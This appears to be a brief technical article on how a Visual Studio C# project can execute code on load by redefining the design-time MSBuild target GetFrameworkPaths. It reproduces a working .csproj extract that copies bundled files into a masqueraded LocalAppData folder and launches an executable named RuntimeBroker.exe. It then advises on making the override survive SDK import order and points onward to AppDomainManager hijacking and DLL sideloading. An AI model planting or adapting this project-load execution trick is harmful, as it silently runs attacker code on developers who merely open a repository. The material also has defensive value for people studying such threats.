title: Visual Studio Project Design-Time MSBuild Execution
html:
Visual Studio Project Design-Time MSBuild Execution

Opening a C# project in Visual Studio is not a passive read. Its design-time build invokes named MSBuild targets to initialize IntelliSense, references and debugging before the developer selects Build or Run. GetFrameworkPaths is one of those targets. A project that redefines it can turn project load into user-context code execution without a separate payload click.[1][2]

The reported project declared resource files, then used MakeDir, Copy and Exec inside its replacement target to stage and launch a colocated payload. This reduced extract preserves the execution path shown in the source's Figure 6; it belongs inside a .csproj, not in a standalone XML file.[1]

<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>

Import order matters: MSBuild uses the last definition of a target. A target written in a project file is not guaranteed to replace the Microsoft target if a later import redefines it. SDK-style projects using <Project Sdk="..."> implicitly import SDK targets after the project body, so inspect the evaluated import order rather than assuming this exact override works in every project. MSBuild.exe -preprocess:expanded.xml project.csproj expands imports without building the project and can help locate the effective target definition.[3][4]

This is a developer-project execution surface, not a VSIX extension installation and not a privilege escalation by itself. If the staged executable uses a malicious adjacent .exe.config or DLL, continue with AppDomainManager hijacking and DLL sideloading.
